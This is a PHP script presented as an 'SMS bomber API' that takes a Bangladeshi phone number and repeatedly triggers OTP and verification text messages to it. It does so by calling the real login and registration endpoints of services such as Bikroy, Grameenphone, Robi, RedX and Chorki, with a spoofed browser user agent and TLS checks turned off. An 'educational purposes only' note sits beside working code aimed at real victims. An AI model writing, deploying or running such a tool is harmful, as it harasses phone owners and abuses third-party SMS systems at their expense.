<?php
// sms_bomber_api.php
// GET Method SMS Bomber API

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET');

// Function to make GET requests
function makeGetRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'status' => $httpCode,
        'success' => ($httpCode >= 200 && $httpCode < 300),
        'url' => $url
    ];
}

// Function to make POST requests
function makePostRequest($url, $data) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'status' => $httpCode,
        'success' => ($httpCode >= 200 && $httpCode < 300),
        'url' => $url
    ];
}

// Get parameters from URL
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';
$service = isset($_GET['service']) ? $_GET['service'] : 'all';
$count = isset($_GET['count']) ? intval($_GET['count']) : 1;
$count = min($count, 10); // Maximum 10 requests for safety

// Validate phone number
if (empty($phone) || !is_numeric($phone) || strlen($phone) != 11) {
    echo json_encode([
        'error' => true,
        'message' => 'Valid 11-digit phone number required (e.g., 01712345678)'
    ]);
    exit;
}

// Results array
$results = [];
$totalRequests = 0;

// Process based on service parameter
switch($service) {
    case 'bikroy':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" . $phone;
            $results[] = makeGetRequest($url);
            $totalRequests++;
            usleep(100000); // 0.1 second delay
        }
        break;
        
    case 'grameenphone':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88" . $phone . "&lang=en&ng=0";
            $results[] = makeGetRequest($url);
            $totalRequests++;
            usleep(100000);
        }
        break;
        
    case 'shukhee':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://auth.shukhee.com/register?mobile=+88" . $phone . "&_rsc=1jwvn";
            $results[] = makeGetRequest($url);
            $totalRequests++;
            usleep(100000);
        }
        break;
        
    case 'deshal':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://app.deshal.net/api/auth/login";
            $data = ['phone' => $phone];
            $results[] = makePostRequest($url, $data);
            $totalRequests++;
            usleep(100000);
        }
        break;
        
    case 'busbd':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://api.busbd.com.bd/api/auth";
            $data = ['phone' => '+88' . $phone];
            $results[] = makePostRequest($url, $data);
            $totalRequests++;
            usleep(100000);
        }
        break;
        
    case 'redx':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp";
            $data = ['mobile' => '+88' . $phone];
            $results[] = makePostRequest($url, $data);
            $totalRequests++;
            usleep(100000);
        }
        break;
        
    case 'robi':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://da-api.robi.com.bd/da-nll/otp/send";
            $data = ['msisdn' => $phone];
            $results[] = makePostRequest($url, $data);
            $totalRequests++;
            usleep(100000);
        }
        break;
        
    case 'chorki':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en";
            $data = ['number' => '+88' . $phone];
            $results[] = makePostRequest($url, $data);
            $totalRequests++;
            usleep(100000);
        }
        break;
        
    case 'deeptoplay':
        for ($i = 0; $i < $count; $i++) {
            $url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en";
            $data = [
                'email' => 'apkzone2.0@gmail.com',
                'phone_number' => '88' . $phone
            ];
            $results[] = makePostRequest($url, $data);
            $totalRequests++;
            usleep(100000);
        }
        break;
        
    case 'quick':
        // Quick test - 3 popular services
        $services = ['bikroy', 'grameenphone', 'robi'];
        foreach($services as $svc) {
            $_GET['service'] = $svc;
            $_GET['count'] = 1;
            ob_start();
            include __FILE__;
            $result = json_decode(ob_get_clean(), true);
            if(isset($result['results'])) {
                $results = array_merge($results, $result['results']);
                $totalRequests += $result['total_requests'];
            }
            usleep(200000);
        }
        break;
        
    case 'all':
    default:
        // Run all services with 1 request each
        $allServices = [
            'bikroy' => 'GET',
            'grameenphone' => 'GET',
            'shukhee' => 'GET',
            'deshal' => 'POST',
            'busbd' => 'POST',
            'redx' => 'POST',
            'robi' => 'POST',
            'chorki' => 'POST',
            'deeptoplay' => 'POST'
        ];
        
        foreach($allServices as $svc => $method) {
            if($method == 'GET') {
                switch($svc) {
                    case 'bikroy':
                        $url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" . $phone;
                        break;
                    case 'grameenphone':
                        $url = "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88" . $phone . "&lang=en&ng=0";
                        break;
                    case 'shukhee':
                        $url = "https://auth.shukhee.com/register?mobile=+88" . $phone . "&_rsc=1jwvn";
                        break;
                }
                $results[] = makeGetRequest($url);
            } else {
                switch($svc) {
                    case 'deshal':
                        $url = "https://app.deshal.net/api/auth/login";
                        $data = ['phone' => $phone];
                        break;
                    case 'busbd':
                        $url = "https://api.busbd.com.bd/api/auth";
                        $data = ['phone' => '+88' . $phone];
                        break;
                    case 'redx':
                        $url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp";
                        $data = ['mobile' => '+88' . $phone];
                        break;
                    case 'robi':
                        $url = "https://da-api.robi.com.bd/da-nll/otp/send";
                        $data = ['msisdn' => $phone];
                        break;
                    case 'chorki':
                        $url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en";
                        $data = ['number' => '+88' . $phone];
                        break;
                    case 'deeptoplay':
                        $url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en";
                        $data = [
                            'email' => 'apkzone2.0@gmail.com',
                            'phone_number' => '88' . $phone
                        ];
                        break;
                }
                $results[] = makePostRequest($url, $data);
            }
            $totalRequests++;
            usleep(200000); // 0.2 second delay between services
        }
        break;
}

// Prepare response
$response = [
    'success' => true,
    'phone' => $phone,
    'service' => $service,
    'total_requests' => $totalRequests,
    'successful_requests' => count(array_filter($results, function($r) { return $r['success']; })),
    'failed_requests' => count(array_filter($results, function($r) { return !$r['success']; })),
    'results' => $results,
    'timestamp' => date('Y-m-d H:i:s'),
    'api_info' => [
        'usage' => 'GET sms_bomber_api.php?phone=01712345678&service=all&count=1',
        'available_services' => [
            'all' => 'All services (default)',
            'quick' => 'Quick test (3 popular services)',
            'bikroy' => 'Bikroy.com',
            'grameenphone' => 'Grameenphone',
            'shukhee' => 'Shukhee.com',
            'deshal' => 'Deshal.net',
            'busbd' => 'BusBD',
            'redx' => 'RedX',
            'robi' => 'Robi',
            'chorki' => 'Chorki',
            'deeptoplay' => 'Deeptoplay'
        ],
        'note' => 'For educational purposes only. Max 10 requests per service.'
    ]
];

echo json_encode($response, JSON_PRETTY_PRINT);
?>